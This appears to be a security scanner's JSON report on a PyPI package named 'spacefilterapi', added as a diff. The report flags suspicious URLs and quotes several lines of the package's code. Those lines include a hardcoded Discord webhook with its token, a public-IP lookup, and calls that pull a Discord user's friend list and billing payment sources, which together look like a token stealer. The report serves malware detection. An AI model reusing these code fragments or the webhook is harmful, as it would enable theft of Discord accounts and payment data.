@@ -1,0 +1,44 @@
+{
+    "issues": 5,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "spacefilterapi/code.py:20",
+                "code": "hook = \"https://discord.com/api/webhooks/1072148031174099095/52443rDyWuiVh2gMpX_CdMAv9_0VrS2olSF9N0W_Lur7cO8QZMDZ3oRvCyMebWk179hp\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "spacefilterapi/code.py:27",
+                "code": "        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "spacefilterapi/code.py:158",
+                "code": "        friendlist = loads(urlopen(Request(\"https://discord.com/api/v6/users/@me/relationships\", headers=headers)).read().decode())\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "spacefilterapi/code.py:183",
+                "code": "        billingjson = loads(urlopen(Request(\"https://discord.com/api/users/@me/billing/payment-sources\", headers=headers)).read().decode())\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "spacefilterapi/code.py:871",
+                "code": "    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.co...lix.com)'\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/spacefilterapi-1.0"
+}
